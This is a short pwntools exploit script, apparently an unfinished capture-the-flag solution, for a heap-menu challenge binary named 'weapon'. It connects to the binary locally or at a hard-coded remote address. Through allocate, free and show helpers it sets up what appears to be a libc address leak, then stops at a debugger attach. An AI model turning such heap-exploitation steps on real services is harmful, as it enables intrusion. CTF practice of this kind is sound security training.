#!/usr/bin/env python
# -*- encoding: utf-8 -*-
'''
@File    :   exp.py
@Time    :   2021/06/07 14:28:59
@Author  :   eur1ka  
@Version :   2.7
@Contact :   eur1ka@163.com
'''
# here put the import lib
from pwn import *
from LibcSearcher import *
import pwnlib
debug = 1
context.log_level = 'debug'
context.arch = 'amd64'
if debug:
    sh = process('weapon')
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
else:
    IP = '82.157.107.61'
    port = 50300
    sh = remote(IP,port)
    libc = ELF('/home/eur1ka/Desktop/Pwn/libc_file/16-64-libc-2.23.so')
elf = ELF('weapon')
ptr = 0x602100

def cmd(choice):
    sh.recvuntil("Your choice :\n")
    sh.sendline(str(choice))

def add(size):
    cmd(1)
    sh.recvuntil("Your Weapon power:\n")
    sh.sendline(str(size))

def edit(idx,content):
    cmd(2)
    sh.recvuntil("The Weapon id:\n")
    sh.sendline(str(idx))
    sh.recvuntil("New power:\n")
    sh.sendline(content)

def show(idx):
    cmd(3)
    sh.recvuntil("The Weapon id:")
    sh.sendline(str(idx))

def dele(idx):
    cmd(4)
    sh.recvuntil("The Weapon id:\n")
    sh.sendline(str(idx))
sh.recvuntil("Give me your name:\n")
sh.sendline("eur1ka")
add(0x410)
add(0x10)
dele(0)
add(0x410)
show(0)
gdb.attach(sh)
pause()
sh.interactive()